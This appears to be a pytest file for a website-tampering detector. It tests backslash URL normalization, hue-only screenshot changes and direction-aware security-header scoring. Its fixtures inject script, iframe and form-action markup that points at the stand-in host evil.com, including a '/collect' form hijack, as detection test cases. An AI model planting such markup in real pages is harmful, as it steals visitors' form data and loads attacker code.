"""Phase 36 — Low sweep, detection-layer code fixes.

Three findings, one module:
- Layer 3 URL normalization diverges from browser (WHATWG) parsing for
  backslash references: an injected ``/\\evil.com/x.js`` navigates to host
  evil.com in every real browser while the old RFC-3986-only normalization
  attributed it to the page's own (trusted, known) host.
- Layer 4 compared grayscale only: a complete hue-only recolor that
  preserves luminance moved SSIM/pHash almost not at all (measured 0.0025).
- Layer 6 scored ANY header value change as "weakening": hardening was
  indistinguishable from regression, and nonce-varying CSPs accrued noise
  on every scan.

Every scenario value quoted in comments was measured against this tree
immediately before being pinned.
"""

import io

import pytest
from PIL import Image, ImageDraw

from worker.detection.dom import _norm_ref, layer3_link_audit
from worker.detection.metadata import (
    _classify_value_change,
    _csp_directives,
    _hsts_strength,
    layer6_security_metadata,
)
from worker.detection.types import PageData, ScanPageData
from worker.detection.visual import (
    _CHROMA_DEADBAND_255,
    _W_CHROMA,
    layer4_visual_diff,
)
from worker.hashing import content_sha256

HTML = "<html><body><h1>Acme Corp</h1><p>Reliable widgets.</p></body></html>"


@pytest.fixture(autouse=True)
def no_network_embeddings(monkeypatch: pytest.MonkeyPatch):
    """Unit tests never download MiniLM (suite-wide convention): the
    pipeline-level floor test below keys on layer 3's rule floor, not on
    the drift channel, which degrades to its documented None mode."""
    from worker.detection import semantics

    monkeypatch.setattr(semantics, "embed_text", lambda text: None)


def _base(**kw) -> PageData:
    d = dict(html=HTML, final_url="https://acme.com/", content_hash=content_sha256(HTML))
    d.update(kw)
    return PageData(**d)


def _cur(html: str = HTML, **kw) -> ScanPageData:
    d = dict(html=html, final_url="https://acme.com/", content_hash=content_sha256(html))
    d.update(kw)
    return ScanPageData(**d)


# --- finding A: layer 3 WHATWG backslash divergence ---------------------------------


class TestLayer3WhatwgNormalization:
    def test_backslash_script_src_attributes_to_attacker_host(self):
        injected = HTML.replace("</body>", '<script src="/\\evil.com/x.js"></script></body>')
        result = layer3_link_audit(_base(), _cur(injected))
        assert result["score"] >= 0.5  # measured 1 - exp(-0.9) ≈ 0.59 pre-fix 0.049 churn-only
        added_new = result["evidence"]["script_src"]["added_new_domains"]
        assert any("evil.com" == _norm_host(u) for u in added_new), added_new

    def test_double_backslash_protocol_relative_iframe(self):
        injected = HTML.replace("</body>", '<iframe src="\\\\evil.com\\x.html"></iframe></body>')
        result = layer3_link_audit(_base(), _cur(injected))
        assert result["score"] >= 0.5
        new_iframe_domains = result["evidence"]["iframe_src"]["added_new_domains"]
        assert any("evil.com" == _norm_host(u) for u in new_iframe_domains)

    def test_mixed_slashes_after_scheme_form_action(self):
        hijacked = HTML.replace("<p>", '<form action="https:/\\evil.com/collect"><input></form><p>')
        result = layer3_link_audit(_base(), _cur(hijacked))
        form_domains = result["evidence"]["form_action"]["added_new_domains"]
        assert form_domains
        assert all("evil.com" == _norm_host(u) for u in form_domains)
        assert result["score"] >= 0.5

    def test_single_backslash_after_scheme_also_authority_delimiter(self):
        # Browsers consume any run of slashes/backslashes after the scheme.
        assert _norm_host(_norm_ref("https://acme.com/", "https:\\evil.com")) == "evil.com"

    def test_backslash_hijack_arms_the_new_domain_floor_end_to_end(self):
        """The Phase-7 rule floor keys on weighted new external domains; a
        backslash form-action hijack must arm it exactly like its
        forward-slash twin (pre-fix it could not)."""
        from worker.detection.pipeline import run_detection

        base = PageData(
            html=HTML,
            final_url="https://acme.com/",
            tls={"fingerprint_sha256": "a" * 64},
            headers={"content-security-policy": "default-src 'self'"},
            robots_txt="User-agent: *",
            screenshot=_png((250, 250, 250)),
            content_hash=content_sha256(HTML),
        )
        hijacked_html = HTML.replace("<p>", '<form action="/\\evil.com\\collect"><input></form><p>')
        cur = ScanPageData(
            html=hijacked_html,
            final_url="https://acme.com/",
            ua_variants=[],
            tls=dict(base.tls),
            headers=dict(base.headers),
            robots_txt=base.robots_txt,
            screenshot=_png((250, 250, 250)),
            content_hash=content_sha256(hijacked_html),
        )
        out = run_detection(base, cur)
        floor_evidence = out["layer9_fusion"]["evidence"].get("rule_floor", {})
        applied = [r["rule"] for r in floor_evidence.get("applied", [])]
        assert "new_sensitive_infrastructure" in applied
        assert out["layer9_fusion"]["score"] >= 0.40

    def test_differential_guards_unchanged_shapes(self):
        """References with no browser/RFC divergence normalize byte-for-byte
        identically to the old RFC-3986 behavior."""
        assert _norm_ref("https://acme.com/", "/search?q=a\\b") == "https://acme.com/search?q=a\\b"
        assert _norm_ref("https://acme.com/", "//fwd.example/p") == "https://fwd.example/p"
        assert (
            _norm_ref("https://acme.com/", "https://cdn.acme.com/a.js")
            == "https://cdn.acme.com/a.js"
        )
        assert _norm_ref("https://acme.com/", "../rel.png") == "https://acme.com/rel.png"
        assert _norm_ref("https://acme.com/", "/abs#frag") == "https://acme.com/abs"
        assert _norm_ref("https://acme.com/", "javascript:void(0)") is None
        assert _norm_ref("https://acme.com/", "#top") is None

    def test_query_payload_backslash_is_data_not_separator(self):
        assert _norm_host(_norm_ref("https://acme.com/", "/s?q=a\\b&next=/x")) == "acme.com"

    def test_interior_path_backslash_after_authority_also_remapped(self):
        # Browsers map '\' to '/' in the path too; the host never changes,
        # but the stored reference matches what a visitor actually loads.
        assert (
            _norm_ref("https://acme.com/", "https://user@evil.com\\p\\q.js")
            == "https://user@evil.com/p/q.js"
        )


def _norm_host(url: str | None) -> str:
    from urllib.parse import urlparse

    return (urlparse(url or "").hostname or "").lower()


# --- finding B: layer 4 chroma channel ----------------------------------------------


def _png(color, size=(320, 480)) -> bytes:
    buf = io.BytesIO()
    Image.new("RGB", size, color).save(buf, format="PNG")
    return buf.getvalue()


class TestLayer4ChromaShift:
    def test_hue_only_recolor_registers(self):
        """The audit's measured blind spot: blue (70,70,160) -> red
        (220,30,30) preserves luminance almost exactly (82 vs 87) and
        previously scored 0.0025 — invisible."""
        result = layer4_visual_diff(
            _base(screenshot=_png((70, 70, 160))), _cur(screenshot=_png((220, 30, 30)))
        )
        assert result["score"] >= 0.10  # measured 0.1779
        assert result["evidence"]["chroma_mean_delta_255"] > 100

    def test_recolor_stays_below_the_single_channel_flag_bar(self):
        """Operating point (documented in the module docstring): a pure
        recolor is an honest 'pixels changed' reading — never something the
        fused model would flag on l4 alone (l4 >= ~0.25 flags solo under
        the deployed artifact). Legitimate brand refreshes are pixel-wise
        identical in kind to hostile ones; corroboration separates them."""
        result = layer4_visual_diff(
            _base(screenshot=_png((70, 70, 160))), _cur(screenshot=_png((220, 30, 30)))
        )
        assert result["score"] <= 0.7 * 0.05 + _W_CHROMA * 1.0 + 0.01

    def test_equal_luminance_chroma_swap_is_visible_too(self):
        """The pure-chroma proof: two colors with IDENTICAL ITU-R 601
        luminance (76.2) but different hue — SSIM 1.0, hashes identical,
        so only the chroma term can see this at all."""
        result = layer4_visual_diff(
            _base(screenshot=_png((255, 0, 0))), _cur(screenshot=_png((5, 100, 143)))
        )
        assert result["evidence"]["ssim"] > 0.99
        assert result["evidence"]["phash_distance_bits"] == 0
        assert result["score"] >= 0.15  # measured ~0.29

    def test_render_noise_stays_silent(self):
        """A uniform +1-per-channel brightness shift (encoder/AA jitter
        territory) is below the deadband: no chroma signal, no luminance
        signal, silent either way."""
        img = Image.new("RGB", (320, 480), (120, 120, 120))
        d = ImageDraw.Draw(img)
        for i in range(0, 480, 6):
            d.line([(0, i), (320, i)], fill=(60, 60, 60))

        def shifted(delta):
            buf = io.BytesIO()
            img.point(lambda v: min(255, v + delta)).save(buf, format="PNG")
            return buf.getvalue()

        result = layer4_visual_diff(_base(screenshot=shifted(0)), _cur(screenshot=shifted(1)))
        assert result["score"] < 0.02
        assert result["evidence"]["chroma_mean_delta_255"] < _CHROMA_DEADBAND_255
        # Just past the deadband the term starts moving — bounded, tiny.
        just_past = layer4_visual_diff(
            _base(screenshot=shifted(0)), _cur(screenshot=shifted(int(_CHROMA_DEADBAND_255) + 1))
        )
        assert 0.0 < just_past["score"] < 0.02
        assert just_past["evidence"]["chroma_mean_delta_255"] >= _CHROMA_DEADBAND_255

    def test_suppressed_only_differences_stay_silent(self):
        """Suppression masks are applied identically before comparison, so
        differences confined to suppressed regions produce no chroma
        evidence either."""
        a, b = _png((200, 40, 40)), _png((40, 40, 200))
        bbox = [(0.25, 0.25, 0.5, 0.5)]
        result = layer4_visual_diff(_base(screenshot=a), _cur(screenshot=b), suppress_bboxes=bbox)
        # The unmasked ring still differs in hue — but ONLY there; assert
        # the term stays proportional rather than saturating.
        assert result["evidence"]["suppressed_regions"] == [[0.25, 0.25, 0.5, 0.5]]
        full = layer4_visual_diff(_base(screenshot=a), _cur(screenshot=b))
        assert result["score"] <= full["score"]

    def test_luminance_channel_contract_unchanged(self):
        shot = _png((250, 250, 250))
        same = layer4_visual_diff(_base(screenshot=shot), _cur(screenshot=shot))
        assert same["score"] < 0.02
        assert same["evidence"]["chroma_mean_delta_255"] == 0.0
        diff = layer4_visual_diff(
            _base(screenshot=_png((255, 255, 255))), _cur(screenshot=_png((0, 0, 0)))
        )
        assert diff["score"] > 0.5


# --- finding C: layer 6 direction-aware header scoring -------------------------------

TLS = {
    "fingerprint_sha256": "a" * 64,
    "not_after": "2027-01-01T00:00:00+00:00",
    "expired": False,
    "subject": "CN=acme.com",
    "issuer": "CN=Let's Encrypt",
}


def _p6(b_headers=None, c_headers=None):
    kw = dict(tls=dict(TLS), robots_txt="")
    if b_headers is not None:
        kw["headers"] = b_headers
    b = PageData(html=HTML, final_url="https://acme.com/", content_hash=content_sha256(HTML), **kw)
    c_kw = dict(kw)
    if c_headers is not None:
        c_kw["headers"] = c_headers
    c = ScanPageData(
        html=HTML, final_url="https://acme.com/", content_hash=content_sha256(HTML), **c_kw
    )
    return b, c


BASE_HEADERS = {
    "content-security-policy": "default-src 'self'",
    "strict-transport-security": "max-age=31536000",
    "x-frame-options": "DENY",
}


def _hdr_evidence(result):
    return result["evidence"]["headers"]


class TestLayer6DirectionalHeaders:
    def test_hardening_never_scores(self):
        hardened = {
            "content-security-policy": "default-src 'self'; script-src 'none'; object-src 'none'",
            "strict-transport-security": "max-age=63072000; includeSubDomains; preload",
            "x-frame-options": "DENY",
        }
        result = layer6_security_metadata(*_p6(BASE_HEADERS, hardened))
        ev = _hdr_evidence(result)
        assert result["score"] == 0.0
        assert not ev.get("security_headers_weakened")
        assert {e["header"] for e in ev.get("security_headers_strengthened", [])} == {
            "content-security-policy",
            "strict-transport-security",
        }

    def test_nonce_csp_variance_is_not_a_change_at_all(self):
        """Per-response nonces present a different value every capture;
        after normalization the policies are identical and must vanish
        from every bucket instead of accruing +0.1 per scan forever."""
        nonce_base = {"content-security-policy": "default-src 'self'; script-src 'nonce-AAAABBBB'"}
        nonce_cur = {"content-security-policy": "default-src 'self'; script-src 'nonce-ZZZZYYYY'"}
        result = layer6_security_metadata(*_p6(nonce_base, nonce_cur))
        assert result["score"] == 0.0
        ev = _hdr_evidence(result)
        assert not ev.get("security_headers_changed")
        assert not ev.get("security_headers_weakened")

    def test_true_weakening_scores_under_the_new_key(self):
        slashed = {
            "content-security-policy": "default-src 'self'",
            "strict-transport-security": "max-age=600",
        }
        result = layer6_security_metadata(*_p6(BASE_HEADERS, slashed))
        assert result["score"] >= 0.1
        weakened = _hdr_evidence(result)["security_headers_weakened"]
        assert [e["header"] for e in weakened] == ["strict-transport-security"]

    def test_xfo_downgrade_and_upgrade(self):
        weaker = dict(BASE_HEADERS, **{"x-frame-options": "SAMEORIGIN"})
        result = layer6_security_metadata(*_p6(BASE_HEADERS, weaker))
        assert [e["header"] for e in _hdr_evidence(result)["security_headers_weakened"]] == [
            "x-frame-options"
        ]
        stronger = dict(BASE_HEADERS, **{"x-frame-options": "DENY"})
        up_base = dict(BASE_HEADERS, **{"x-frame-options": "SAMEORIGIN"})
        result = layer6_security_metadata(*_p6(up_base, stronger))
        assert result["score"] == 0.0
        assert [e["header"] for e in _hdr_evidence(result)["security_headers_strengthened"]] == [
            "x-frame-options"
        ]

    def test_referrer_policy_regression_detected(self):
        base = dict(BASE_HEADERS, **{"referrer-policy": "no-referrer"})
        laxer = dict(base, **{"referrer-policy": "unsafe-url"})
        result = layer6_security_metadata(*_p6(base, laxer))
        assert result["score"] >= 0.1
        assert _hdr_evidence(result)["security_headers_weakened"][0]["header"] == "referrer-policy"

    def test_unclassifiable_change_recorded_not_scored(self):
        mixed = {"content-security-policy": "default-src *; style-src 'self'"}
        result = layer6_security_metadata(
            *_p6({"content-security-policy": "default-src 'self'"}, mixed)
        )
        ev = _hdr_evidence(result)
        assert result["score"] == 0.0
        assert [e["header"] for e in ev["security_headers_changed"]] == ["content-security-policy"]
        assert not ev.get("security_headers_weakened")

    def test_removal_and_addition_contracts_unchanged(self):
        removed = {k: v for k, v in BASE_HEADERS.items() if k != "content-security-policy"}
        result = layer6_security_metadata(*_p6(BASE_HEADERS, removed))
        assert result["score"] >= 0.3
        assert _hdr_evidence(result)["security_headers_removed"] == ["content-security-policy"]
        more = dict(BASE_HEADERS, **{"referrer-policy": "no-referrer"})
        result = layer6_security_metadata(*_p6(BASE_HEADERS, more))
        assert result["score"] == 0.0
        assert "referrer-policy" in _hdr_evidence(result)["security_headers_added"]

    def test_formatting_noise_is_silent(self):
        sloppy = {
            "content-security-policy": "DEFAULT-SRC 'self'",  # case only
            "strict-transport-security": "Max-Age=31536000 ; ",  # case/whitespace
            "x-frame-options": " deny ",  # case/whitespace
        }
        result = layer6_security_metadata(*_p6(BASE_HEADERS, sloppy))
        assert result["score"] == 0.0
        ev = _hdr_evidence(result)
        assert not ev.get("security_headers_weakened")
        assert not ev.get("security_headers_changed")


class TestHeaderComparators:
    def test_hsts_strength_flag_dominance(self):
        # Losing includeSubDomains is a regression even with a bigger max-age.
        assert _hsts_strength("max-age=63072000") < _hsts_strength(
            "max-age=31536000; includeSubDomains"
        )

    def test_csp_directive_parser_normalizes_nonces_and_case(self):
        dirs = _csp_directives("DEFAULT-SRC 'self'; script-src 'nonce-RandomBlob123'")
        assert dirs["default-src"] == frozenset({"'self'"})
        assert dirs["script-src"] == frozenset({"'nonce-'"})

    @pytest.mark.parametrize(
        ("b", "c", "expected"),
        [
            ("max-age=100", "max-age=50", "weaker"),
            ("max-age=50", "max-age=100", "stronger"),
            ("max-age=100", "max-age=100; includeSubDomains", "stronger"),
            ("garbage", "max-age=1", None),
        ],
    )
    def test_classify_hsts(self, b, c, expected):
        assert _classify_value_change("strict-transport-security", b, c) == expected

    def test_unknown_header_falls_back_to_none(self):
        assert _classify_value_change("x-custom-thing", "a", "b") is None
